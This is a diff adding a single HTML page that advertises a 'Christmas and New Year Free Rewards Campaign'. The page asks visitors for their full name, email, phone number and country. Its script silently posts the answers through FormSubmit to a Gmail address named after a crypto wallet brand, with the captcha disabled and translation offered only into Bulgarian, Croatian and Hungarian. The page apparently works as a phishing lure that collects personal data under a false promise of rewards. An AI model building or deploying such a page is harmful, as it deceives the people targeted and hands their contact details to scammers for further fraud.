@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Christmas and New Year Free Rewards Campaign</title>
+
+    <!-- SweetAlert2 -->
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+    <style>
+      body {
+        font-family: "Segoe UI", sans-serif;
+        background: #060c17;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 2rem;
+        color: #172f55;
+      }
+
+      .form-container {
+        max-width: 600px;
+        width: 100%;
+        background: #fff;
+        padding: 2rem;
+        border-radius: 1rem;
+        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        position: relative;
+      }
+
+      input {
+        width: 100%;
+        padding: 0.8rem;
+        margin-bottom: 1rem;
+        border: 1px solid #ddd;
+        border-radius: 0.5rem;
+      }
+
+      button {
+        background: #172f55;
+        color: #fff;
+        border: none;
+        padding: 0.8rem 1.5rem;
+        border-radius: 0.5rem;
+        cursor: pointer;
+        width: 100%;
+      }
+
+      button:hover {
+        background: #1f2937;
+      }
+
+      .logo {
+        height: 35px;
+        margin-bottom: 1rem;
+      }
+
+      /* Google Translate */
+      #google_translate_element {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        z-index: 10;
+      }
+
+      .goog-te-gadget-simple {
+        border-radius: 6px !important;
+        padding: 5px !important;
+        font-size: 12px !important;
+      }
+    </style>
+  </head>
+
+  <body>
+    <form class="form-container" id="userForm">
+      <!-- Google Translate -->
+      <div id="google_translate_element"></div>
+
+      <img class="logo" src="/images/logo.png" alt="Logo" />
+      <img
+        src="/images/banner.png"
+        alt="Banner"
+        style="max-width: 100%; height: auto; margin-bottom: 1rem"
+      />
+
+      <h2>Claim Your Free Rewards Now</h2>
+
+      <label>Full Name</label>
+      <input
+        type="text"
+        name="fullname"
+        placeholder="Enter your Full Name"
+        required
+      />
+
+      <label>Email</label>
+      <input
+        type="email"
+        name="email"
+        placeholder="Enter your Email"
+        required
+      />
+
+      <label>Phone Number</label>
+      <input type="text" name="phone" placeholder="Enter your Phone Number" />
+
+      <label>Country</label>
+      <input
+        type="text"
+        name="country"
+        placeholder="Enter your Country"
+        required
+      />
+
+      <!-- FormSubmit config -->
+      <input type="hidden" name="_subject" value="New Reward Claim" />
+      <input type="hidden" name="_captcha" value="false" />
+      <input type="hidden" name="_template" value="table" />
+
+      <button type="submit">Submit</button>
+    </form>
+
+    <!-- AJAX + SweetAlert -->
+    <script>
+      const form = document.getElementById("userForm");
+
+      form.addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+
+        try {
+          const response = await fetch(
+            "https://formsubmit.co/ajax/bitgetwalletorg@gmail.com",
+            {
+              method: "POST",
+              body: formData,
+            }
+          );
+
+          if (response.ok) {
+            Swal.fire({
+              icon: "success",
+              title: "Submitted Successfully 🎉",
+              text: "Your reward claim has been received.",
+              confirmButtonColor: "#172f55",
+            });
+            form.reset();
+          } else {
+            throw new Error("Submission failed");
+          }
+        } catch (error) {
+          Swal.fire({
+            icon: "error",
+            title: "Submission Failed ❌",
+            text: "Please check your internet connection and try again.",
+            confirmButtonColor: "#172f55",
+          });
+        }
+      });
+    </script>
+
+    <!-- Google Translate (bg, hr, hu only) -->
+    <script>
+      function googleTranslateElementInit() {
+        new google.translate.TranslateElement(
+          {
+            pageLanguage: "en",
+            includedLanguages: "bg,hr,hu",
+            layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+          },
+          "google_translate_element"
+        );
+      }
+    </script>
+
+    <script
+      src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"
+      async
+    ></script>
+  </body>
+</html>
